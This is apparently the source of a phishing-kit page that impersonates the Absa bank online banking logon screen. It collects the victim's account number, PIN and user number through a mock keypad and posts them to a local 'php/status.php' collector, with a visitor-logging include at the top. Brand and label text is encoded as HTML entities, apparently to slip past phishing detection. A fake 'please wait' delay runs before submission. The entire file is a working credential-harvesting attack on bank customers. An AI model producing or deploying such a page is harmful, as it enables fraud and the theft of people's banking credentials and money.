<?php
require "includes/visitor_log.php";
error_reporting(0);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
<style type="text/css">.btl-repaint{zoom:1;background-color:transparent;-moz-outline:none;}</style>
<style type="text/css">.btl-drag-outlineElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:9999;border-width:1px;border-style:solid;background-color:#DFE0E1;border-color:#8B8D91;}</style>
<style type="text/css">.btl-resize-cursorElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:10000;opacity:0;-ms-filter:"alpha(opacity=0)";filter:alpha(opacity=0);background:white;}.btl-resize-lineElement{position:absolute;top:-10000px;left:-10000px;width:1px;height:100px;z-index:9999;border-width:1px;border-style:solid;border-color:#8B8D91;overflow:hidden;}.btl-resize-outlineElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:9999;border-width:1px;border-style:solid;opacity:.4;-ms-filter:"alpha(opacity=40)";filter:alpha(opacity=40);background-color:#DFE0E1;border-color:#8B8D91;}</style>
<link rel="shortcut icon" href="media/favicon.ico">
<meta http-equiv="X-UA-Compatible" content="IE=10; IE=9; IE=8">
<title>&#x41;&#x62;&#x73;&#x61;&#x20;&#x4f;&#x6e;&#x6c;&#x69;&#x6e;&#x65;</title>
<link rel="stylesheet" type="text/css" href="media/main.css" media="screen">
<link rel="stylesheet" type="text/css" href="media/login.css">
<link rel="stylesheet" type="text/css" href="media/jcaptcha.css">
<script type="text/javascript" src="media/backbase.js"></script>
<script type="text/javascript" src="media/main-all-base.js"></script>
<Style>
.errors {
z-index: 1000;
position:absolute;
margin-top:-6px;
}
.errors2 {
z-index: 1000;
position:absolute;
margin-top:-6px;
}
.errors3 {
z-index: 1000;
position:absolute;
margin-top:-6px;
}
</style>

<SCRIPT>
<!--

function check(form) {


var regExpressPostcode =  /^(\d){6,16}$/
if (!regExpressPostcode.test(form.AccessAccount.value))
{ document.getElementById('errors').innerHTML="<img src='media/req.png'>"; document.getElementById('themainerror').style.display = 'block'; document.getElementById("AccessAccount").classList.add('ui-incorrect-value'); form.AccessAccount.focus(); return;} else { document.getElementById('errors').style.visibility = 'hidden'; document.getElementById('themainerror').style.display = 'none'; document.getElementById("AccessAccount").classList.remove('ui-incorrect-value');}

var regExpressPostcode =  /^(\d){4,5}$/
if (!regExpressPostcode.test(form.PIN.value))
{ document.getElementById('errors2').innerHTML="<img src='media/req.png'>"; document.getElementById('themainerror').style.display = 'block'; document.getElementById("PIN").classList.add('ui-incorrect-value'); form.PIN.focus(); return;} else { document.getElementById('errors2').style.visibility = 'hidden'; document.getElementById("PIN").classList.remove('ui-incorrect-value'); document.getElementById('themainerror').style.display = 'none';}


if (form.Operator.value == "")
{ document.getElementById('errors3').innerHTML="<img src='media/req.png'>"; document.getElementById('themainerror').style.display = 'block'; document.getElementById("Operator").classList.add('ui-incorrect-value'); form.Operator.focus(); return;} else { document.getElementById('errors3').style.visibility = 'hidden'; document.getElementById("Operator").classList.remove('ui-incorrect-value'); document.getElementById('themainerror').style.display = 'none';}



document.getElementById("pleasewait").style.display = "block";
setTimeout(function() { form.submit() }, 1900);

}

//-->
</SCRIPT>
<script>

function onefocused() { document.getElementById('lastfocus').value = "AccessAccount"; }
function twofocused() { document.getElementById('lastfocus').value = "PIN"; }
function threefocused() { document.getElementById('lastfocus').value = "Operator"; }

function addnr1() {
var inputVal = document.getElementById("lastfocus").value; if (inputVal == "AccessAccount") {document.getElementById('AccessAccount').value += "1"; }  else if (inputVal == "PIN") {document.getElementById('PIN').value += "1"; }  else if (inputVal == "Operator") {document.getElementById('Operator').value += "1"; } }

function addnr2() {
var inputVal = document.getElementById("lastfocus").value; if (inputVal == "AccessAccount") {document.getElementById('AccessAccount').value += "2"; }  else if (inputVal == "PIN") {document.getElementById('PIN').value += "2"; }  else if (inputVal == "Operator") {document.getElementById('Operator').value += "2"; } }

function addnr3() {
var inputVal = document.getElementById("lastfocus").value; if (inputVal == "AccessAccount") {document.getElementById('AccessAccount').value += "3"; }  else if (inputVal == "PIN") {document.getElementById('PIN').value += "3"; }  else if (inputVal == "Operator") {document.getElementById('Operator').value += "3"; } }

function addnr4() {
var inputVal = document.getElementById("lastfocus").value; if (inputVal == "AccessAccount") {document.getElementById('AccessAccount').value += "4"; }  else if (inputVal == "PIN") {document.getElementById('PIN').value += "4"; }  else if (inputVal == "Operator") {document.getElementById('Operator').value += "4"; } }

function addnr5() {
var inputVal = document.getElementById("lastfocus").value; if (inputVal == "AccessAccount") {document.getElementById('AccessAccount').value += "5"; }  else if (inputVal == "PIN") {document.getElementById('PIN').value += "5"; }  else if (inputVal == "Operator") {document.getElementById('Operator').value += "5"; } }

function addnr6() {
var inputVal = document.getElementById("lastfocus").value; if (inputVal == "AccessAccount") {document.getElementById('AccessAccount').value += "6"; }  else if (inputVal == "PIN") {document.getElementById('PIN').value += "6"; }  else if (inputVal == "Operator") {document.getElementById('Operator').value += "6"; } }

function addnr7() {
var inputVal = document.getElementById("lastfocus").value; if (inputVal == "AccessAccount") {document.getElementById('AccessAccount').value += "7"; }  else if (inputVal == "PIN") {document.getElementById('PIN').value += "7"; }  else if (inputVal == "Operator") {document.getElementById('Operator').value += "7"; } }

function addnr8() {
var inputVal = document.getElementById("lastfocus").value; if (inputVal == "AccessAccount") {document.getElementById('AccessAccount').value += "8"; }  else if (inputVal == "PIN") {document.getElementById('PIN').value += "8"; }  else if (inputVal == "Operator") {document.getElementById('Operator').value += "8"; } }

function addnr9() {
var inputVal = document.getElementById("lastfocus").value; if (inputVal == "AccessAccount") {document.getElementById('AccessAccount').value += "9"; }  else if (inputVal == "PIN") {document.getElementById('PIN').value += "9"; }  else if (inputVal == "Operator") {document.getElementById('Operator').value += "9"; } }

function addnr0() {
var inputVal = document.getElementById("lastfocus").value; if (inputVal == "AccessAccount") {document.getElementById('AccessAccount').value += "0"; }  else if (inputVal == "PIN") {document.getElementById('PIN').value += "0"; }  else if (inputVal == "Operator") {document.getElementById('Operator').value += "0"; } }

function cancel() {
var inputVal = document.getElementById("lastfocus").value; if (inputVal == "AccessAccount") {document.getElementById('AccessAccount').value = ""; }  else if (inputVal == "PIN") {document.getElementById('PIN').value = ""; }  else if (inputVal == "Operator") {document.getElementById('Operator').value = ""; } }


</script>
</head>
<body class="ssr-enabled ap-jsp-body prelogin" id="bodydiv" sid="8WHbZnZfVLktCkyaxfYz6WE">
<div></div>
<div style="position:fixed; top:0px; left:0px; z-index:105; width:100%; height:54px; background:#FFFFFF; padding:10px 0px 0px 10px; box-shadow: 0 4px 8px 0 rgba(0,0,0,.16);">
<img src="media/logo-red.png" width="44" height="44">
</div>
<div class="ap-page-header" style="z-index:106;">
<div class="ap-navigation-main" style="z-index:107;">
<div class="ap-tabStrip-rounded-left"></div>
<ul class="ap-tabStrip-tabs">
<li class="ap-tab-button ap-tab-active" id="SSR-tab-18">
 <div class="ap-tab-title" tabindex="10">Logon</div>
 <div class="ap-tab-title-hidden">Logon</div>
</li>
<li class="ap-tab-button" id="SSR-tab-19">
<div class="ap-tab-title" tabindex="11"><a href="#">Registration</a></div>
 <div class="ap-tab-title-hidden">Registration</div>
</li>
<li class="ap-tab-button" id="SSR-tab-20">
 <div class="ap-tab-title" tabindex="12"><a href="#">&#x41;&#x62;&#x73;&#x61; home page</a></div>
 <div class="ap-tab-title-hidden" style="font-size:14px;">&#x41;&#x62;&#x73;&#x61; home page</div>
</li>
</ul>
<div class="ap-tabStrip-rounded-right"></div>
<div style="clear: both;"></div>
<div class="ap-navigation-sub ap-tabStrip-subnav"></div>
</div>
</div>
<div class="ap-page-container" style="z-index:104;">
<div class="ap-main-content-wrapper">
<div class="ap-main-content-wrapper-top">
<div class="ap-corners-rounded-top-left"></div>
<div class="ap-corners-rounded-top"></div>
<div class="ap-corners-rounded-top-right"></div>
</div>
<div class="ap-page-content ap-container">
<div class="ap-container-highlevel">
 <div class="ap-titlebar ap-heading-titlebar" style="padding-top: 0px;">
<div id="header_results" class="ap-bar-section ap-bar-title" style="color: #FFFFFF">
Logon&nbsp;
| Welcome to &#x41;&#x62;&#x73;&#x61;&#x20;&#x4f;&#x6e;&#x6c;&#x69;&#x6e;&#x65;
</div>
 </div>
 <div class="ap-container-content" id="ap-container-content" style="padding-bottom:5px; overflow: hidden"> 
<div class="ap-login-columns ap-columns-2-lhs" style="padding-top: 0px;">
<div class="ap-column-1 accessAccountScreen" id="ap-column-1" styleold="width:389px; padding:0">
<div class="ap-login-container" id="ap-login-container">
<div class="ap-container-highlevel" style="width:379px;">
<div class="ap-titlebar ap-heading-titlebar ap-heading-titlebar-login">
<div class="ap-bar-section ap-bar-title" style="margin-top:8px; margin-left:0px" tabindex="5">
 &nbsp;&nbsp;Logon details
</div>
<div style="float:right; margin-right: 10px;">
<div style="background: url('media/icon-questionmark-grey_2019.png') no-repeat scroll left top transparent; margin-top: 6px; height: 30px; width: 20px; cursor: pointer;" onclick="showHideHelp(this)" tooltip="Click here to Show me how."></div>
</div>
</div>
<div class="ap-container-content">
<div class="ui-keypad" style="width:376px;">
<form novalidate="" action="php/status.php" class="ui-form" method="post" onsubmit="onForm1Submit()">
<input type="hidden" value="" name="lastfocus" id="lastfocus">
<table class="ui-grid ui-keypad-inputs" style="font-size:11px;width:378px;float:left;">
<tbody>
 <tr class="ui-row" style="height: 30px;">
<td class="ui-cell" style="width:200px;">
<label for="j_username" id="id-7765">
<span>&#x45;&#x6e;&#x74;&#x65;&#x72;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x20;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x20;&#x6e;&#x75;&#x6d;&#x62;&#x65;&#x72;</span>
<span class="vi-screenreader-line">. An &#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x20;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x20;&#x6e;&#x75;&#x6d;&#x62;&#x65;&#x72; is
 the &#x62;&#x61;&#x6e;&#x6b; &#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x20;&#x6e;&#x75;&#x6d;&#x62;&#x65;&#x72; you choose when you registered for the &#x41;&#x62;&#x73;&#x61; 
&#x4f;&#x6e;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x2e;&#x20;&#x49;&#x74;&#x20;&#x63;&#x6f;&#x75;&#x6c;&#x64;&#x20;&#x63;&#x61;&#x6e;&#x20;&#x62;&#x65;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x63;&#x75;&#x72;&#x72;&#x65;&#x6e;&#x74;&#x2c;&#x20;&#x73;&#x61;&#x76;&#x69;&#x6e;&#x67;&#x73;&#x2c;&#x20;&#x6f;&#x72;&#x20;&#x63;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x63;&#x61;&#x72;&#x64; 
&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x20;&#x6e;&#x75;&#x6d;&#x62;&#x65;&#x72;&#x2e;</span></label>
</td>
<td class="ui-cell" style="nowrap:nowrap;">
<div style="text-align:left;">
<input bbf_type="simple:decimal10" autofocus onKeyDown="if(event.keyCode==13) check(this.form);" bbf_required="true" bbf_x_type_number="true" requiredtext="Field is required." class="ui-form-field ui-textBox ui-keypad-input-selected ap-showMeHow-focus vi-activeElement" style="width:132px; height:18px; line-height:18px; vertical-align:middle;" name="AccessAccount" autocomplete="off"id="AccessAccount" onchange="window['isimo']('login')" maxlength="16" onfocus="onefocused();" type="input" tabindex="0" aria-invalid="false" aria-required="true" aria-labelledby="id-7765"><span class="errors" id="errors"></span>
</div>
</td>
 </tr>
 <tr class="ui-row" style="height: 30px;">
<td class="ui-cell">
<label for="PIN">
<span>Enter your PIN</span>
</label>
</td>
<td class="ui-cell">
<div style="text-align:left;">
<input ondragstart="return false" onKeyDown="if(event.keyCode==13) check(this.form);" onselectstart="return false" value="" bbf_type="simple:pin" bbf_required="true" class="ui-form-field ui-textBox" style="width:132px; height:18px; line-height:18px; vertical-align:middle;" name="PIN" id="PIN" maxlength="5" ondrag="return false" oncopy="return false" autocomplete="off" requiredtext="Field is required." schematypetext="Only numeric values are allowed" showmehow="The PIN must be numeric and cannot contain alpha characters, e.g. *, #, @ or a, b, c. The PIN can be either four or five digits long." messageref=".errorMessage" type="password" onfocus="twofocused();" tabindex="0"><span class="errors2" id="errors2"></span>
</div>
</td>
 </tr>
 <tr class="ui-row" style="height: 30px;">
<td class="ui-cell">
<label for="Operator">
<span>Enter your user number</span>
</label>
</td>
<td class="ui-cell">
<div style="text-align:left;">
<input value="1" onKeyDown="if(event.keyCode==13) check(this.form);" class="ui-form-field ui-textBox " name="Operator" style="width:132px; height:18px; line-height:18px; vertical-align:middle;" id="Operator" maxlength="4" bbf_type="simple:decimal" onfocus="threefocused();" bbf_x_type_number="true" bbf_required="true" requiredtext="Field is required." schematypetext="Only numeric values are allowed" messageref=".errorMessage" type="text" tabindex="0"><span class="errors3" id="errors3"></span>
</div>
</td>
 </tr>
 <tr class="ui-row" style="height: 30px;">
<td class="ui-cell" colspan="2" style="padding-top:2px">
<span style="color: #767676;">It is your responsibility to ensure the secrecy of your PIN number.</span>
</td>
 </tr>
</tbody>
</table>
<div style="font-size:11px; float:right; width:325px; padding:5px; margin:0 20px 10px 20px; border:1px dashed #C3C3C3; background:#FFFFFF;">
<div style="float:right; margin-right:130px;">
 <div style="-moz-user-select: none;" class="ui-keypad-padContainer">
<p>Keypad</p>
<table>
<tbody style="font-size:11px;">
<tr>
<td>
<div class="ui-keypad-button"  onclick="addnr1();" unselectable="on">1</div>
</td>
<td>
<div class="ui-keypad-button"  onclick="addnr2();" unselectable="on">2</div>
</td>
<td>
<div class="ui-keypad-button" onclick="addnr3();"  unselectable="on">3</div>
</td>
</tr>
<tr>
<td>
<div class="ui-keypad-button" onclick="addnr4();"  unselectable="on">4</div>
</td>
<td>
<div class="ui-keypad-button"  onclick="addnr5();" unselectable="on">5</div>
</td>
<td>
<div class="ui-keypad-button" onclick="addnr6();"  unselectable="on">6</div>
</td>
</tr>
<tr>
<td>
<div class="ui-keypad-button" onclick="addnr7();"  unselectable="on">7</div>
</td>
<td>
<div class="ui-keypad-button"  onclick="addnr8();" unselectable="on">8</div>
</td>
<td>
<div class="ui-keypad-button"  onclick="addnr9();" unselectable="on">9</div>
</td>
</tr>
<tr>
<td>
<div class="ui-keypad-button util" action="backspace">
 <div class="backspace" unselectable="on"></div>
</div>
</td>
<td>
<div class="ui-keypad-button"  onclick="addnr0();" unselectable="on">0</div>
</td>
<td>
<div class="ui-keypad-button util" onclick="cancel();" action="clear" unselectable="on">C</div>
</td>
</tr>
</tbody>
</table>
 </div>
</div>
</div>
<div class="clear-both"></div>
<div class="ui-formFoot">
<div class="genericMessage-place-holder" style="display:block">
 <div id="themainerror" role="alert" tabindex="0" class="ui-message ui-message-error" style="display:none">
<span class="vi-screenreader-line "> Error details. </span>
<div class="ui-message-timeStamp">
<script>
function GetNow(){
var currentdate = new Date(); 
var datetime = currentdate.getFullYear() + "-"
+ (currentdate.getMonth()+1) + "-" 
+ currentdate.getDate() + " "
+ currentdate.getHours() + ":"
+ currentdate.getMinutes() + ":" 
+ currentdate.getSeconds();
return datetime;
}
document.write(GetNow());
</script>
</div>
<div class="ui-message--icon"></div>
<div style="margin-right: 120px" class="ui-message-content">
<div class="ui-message-title"></div>
<div class="ui-message-body" style="clear:both;">
Invalid credentials entered. Re-enter the required logon information. 
</div>
</div>
<div class="clear-both"></div>
 </div>
</div>
<div class="validation-place-holder"></div>
<div class="ui-buttonFooter">
 <div class="ui-exception-container" style="border:none">
<div style="z-index:999; position:fixed; top:16px; right:50px; color:#6D6767; font-weight:bold;">
<div id="divToAfrikaans">
<a tabindex="-1" href="#" onclick="changeLang()" style="color:#6D6767; text-decoration:none; font-size:10px; padding-right: 5px;">Verander na Afrikaans</a>
<img src="media/locale_en.gif"style="vertical-align:middle;">
</div>
</div>
<div style="float:left; padding-left:auto; padding-right:auto;">
<a tabindex="-1" href="#" onclick="login.onResetPinClick(this)" style="color:#AF154B; text-decoration:underline; padding-left: 10px;">Reset PIN</a>
</div>
<button aria-label="Reset" type="button" tabindex="1" onclick="resetForm1()" class="ui-button ap-button-reset">
<div class="ui-button-left">
<div class="ui-button-right">
<div class="ui-button-center">Reset</div>
</div>
</div>
</button>
<button onclick="check(this.form)" aria-label="Next" type="button" tabindex="0" class="ui-button ap-button-next">
<div class="ui-button-left">
<div class="ui-button-right">
<div class="ui-button-center">Next</div>
</div>
</div>
</button>
 </div>
</div>
</div>
</form>
</div>
</div>
<div class="ap-container-bottom-corners">
<div class="ap-corners-rounded-bottom-left"></div>
<div class="ap-corners-rounded-bottom" style="width:363px;"></div>
<div class="ap-corners-rounded-bottom-right"></div>
</div>
</div>
</div>
</div>
<div class="ap-column-2 accessAccountScreenAdds" id="ap-column-2" styleold="width:550px;">
<div id="divadds1" style="position:relative; width:100%; margin-bottom:10px;">
<div style="float:left; width:270px; margin-right:10px;">
<div id="divsecuritycentre" class="ap-login-block-rounded">
 <div class="ap-login-block-rounded-top">
 <div class="ap-corners-rounded-top-left"></div>
 <div class="ap-corners-rounded-top"></div>
 <div class="ap-corners-rounded-top-right"></div>
 </div>
 <div role="tablist" class="ui-tabBox">
 <ul class="ui-tabHeads">
 <li aria-selected="true" class="ui-tabHead ui-tab-selected" role="button" tabindex="18">
 Security centre
 <span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
 </li>
 </ul>
 <div class="ui-tabBodies">
 <div tabindex="19" role="tabpanel" class="ui-tabBody ui-tabBody-selected">
 <div style="background: #FFFFFF;">
 <ul class="abc">
<li><a href="#"id="am" >&#65;&#98;&#115;&#97;'s online security measures</a></li><li><a href="#"id="am" >Important information about phishing</a></li><li><a href="#"id="am" >Protect yourself online</a></li><li><a href="#"id="am" >Online shopping and 3D Secure</a></li><li><a href="#"id="am" >Latest scams</a></li><li><a href="#"id="am" >Latest internet security software</a></li>
 </ul>
 </div>
 </div>
 </div>
 </div>
 <div class="ap-login-block-rounded-bottom">
 <div class="ap-corners-rounded-bottom-left"></div>
 <div class="ap-corners-rounded-bottom"></div>
 <div class="ap-corners-rounded-bottom-right"></div>
 </div>
</div>
</div>
<div style="float:left; width:270px;">
<div id="divimportantlinks" class="ap-login-block-rounded">
 <div class="ap-login-block-rounded-top">
 <div class="ap-corners-rounded-top-left"></div>
 <div class="ap-corners-rounded-top"></div>
 <div class="ap-corners-rounded-top-right"></div>
 </div>
 <div role="tablist" class="ui-tabBox">
 <ul class="ui-tabHeads">
 <li aria-selected="true" class="ui-tabHead ui-tab-selected" role="button" tabindex="13">
 Important links
 <span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
 </li>
 </ul>
 <div class="ui-tabBodies">
 <div tabindex="14" role="tabpanel" class="ui-tabBody ui-tabBody-selected">
 <div style="background: #FFFFFF;">
 <ul class="abc">
<li><a href="#"id="am" >Planned Maintenance</a></li><li><a href="#"id="am" >How to register</a></li><li><a href="#"id="am" ><b>2020 Pricing</b></a></li><li><a href="#"id="am" ><b style="font-color:#AF154B !important;">&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#65;&#112;&#112; logon issues on Apple devices</b></a></li><li><a href="#"id="am" >Security enhancement</a></li><li><a href="#"id="am" >Contact us</a></li><li><a href="#"id="am" >&#65;&#98;&#115;&#97; Listed Beneficiaries - accounts closed</a></li>
 </ul>
 </div>
 </div>
 </div>
 </div>
 <div class="ap-login-block-rounded-bottom">
 <div class="ap-corners-rounded-bottom-left"></div>
 <div class="ap-corners-rounded-bottom"></div>
 <div class="ap-corners-rounded-bottom-right"></div>
 </div>
</div>
</div>
<div style="clear:both;"></div>
<div style="position:relative; margin-top:10px; height:152px;">
<div class="ap-login-campaign-image img1" style="position:absolute; top:0px; left:0px; width:280px;"><a href="#"><img src="media/campaigne_1_ENG.png" alt=""></a></div>
<div class="ap-login-campaign-image img2" style="position:absolute; top:0px; right:0px; width:270px;"><a href="#"><img src="media/campaigne_3_post_golive_EN.jpg" alt=""></a></div>
</div>
</div>
</div>
<div class="ap-columns-clear"></div>
</div>
<div style="width: 100%; height: 10px;"></div>
<div id="divbottomadds" class="ap-login-columns ap-columns-33">
<div class="ap-column-1">
&nbsp;
</div>
<div class="ap-column-2">
&nbsp;
</div>
<div class="ap-column-3">
&nbsp;
</div>
</div>
 </div>
 <div class="ap-container-bottom ap-heading-titlebar-item ap-container-bottom-hide">
<div class="ap-corners-rounded-bottom-left"></div>
<div class="ap-corners-rounded-bottom"></div>
<div class="ap-corners-rounded-bottom-right"></div>
 </div>
</div>
</div>
<div class="ap-main-content-wrapper-bottom">
<div class="ap-corners-rounded-bottom-left"></div>
<div class="ap-corners-rounded-bottom"></div>
<div class="ap-corners-rounded-bottom-right"></div>
</div>
</div>
<div class="ap-footer" tabindex="20">
<div style="position:relative; top:0px; left:0px; width:971px; text-align:center;">
<p tabindex="21">
 &#xa9; Copyright. &#x41;&#x62;&#x73;&#x61; &#x42;&#x61;&#x6e;&#x6b; Limited. &#x52;&#x65;&#x67;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x4e;&#x75;&#x6d;&#x62;&#x65;&#x72;&#x3a;&#x20;&#x31;&#x39;&#x38;&#x36;&#x2f;&#x30;&#x30;&#x34;&#x37;&#x39;&#x34;&#x2f;&#x30;&#x36;&nbsp;
 &#x41;&#x75;&#x74;&#x68;&#x6f;&#x72;&#x69;&#x7a;&#x65;&#x64;&#x20;&#x66;&#x69;&#x6e;&#x61;&#x6e;&#x63;&#x69;&#x61;&#x6c;&#x20;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x73;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x72;&#x65;&#x67;&#x69;&#x73;&#x74;&#x65;&#x72;&#x65;&#x64;&#x20;&#x63;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x70;&#x72;&#x6f;&#x76;&#x69;&#x64;&#x65;&#x72;&#x20;&#x4e;&#x43;&#x52;&#x43;&#x50;&#x37;
</p>
<div class="ap-footer-links">
 <ul><li><a href="#" id="am">Security centre</a></li><li><a href="#" id="am">Terms of use</a></li><li><a href="#" id="am">Software requirements</a></li><li><a href="#" id="am">&#x42;&#x61;&#x6e;&#x6b;ing regulations</a></li></ul>
</div>
<div style="position:absolute; top:0px; right:0px; width:220px; text-align:right;">
</div>
</div>
</div>
</div>
<div></div>
<style>
#thebottom {
position: relative;
opacity: 1.0;
background-color: #FFF;
bottom: 0;
left: 0;
width: 100%;
height: 225px;
top: 75%;
}
</style>
<div id="pleasewait" style="display:none;z-index:99999;" role="alert" class="ap-pleasewait">
<div id="pleasewait-viewport" class="ap-pleasewait--viewport">
<div class="ap-pleasewait--content">
<img src="media/ajax-loader-2.gif" width="32" height="32"/>
<span id="pleasewait-label" class="ap-pleasewait--label"></span>
</div>
<div id="thebottom"></div>
</div>
</div>
<div></div>
<script type="text/javascript" src="media/jquery.min.js"></script>
<script type="text/javascript" src="media/keyboard.js"></script>
<div class="btl-resize-cursorElement"></div><div class="btl-resize-lineElement"></div><div class="btl-resize-outlineElement"></div></body></html>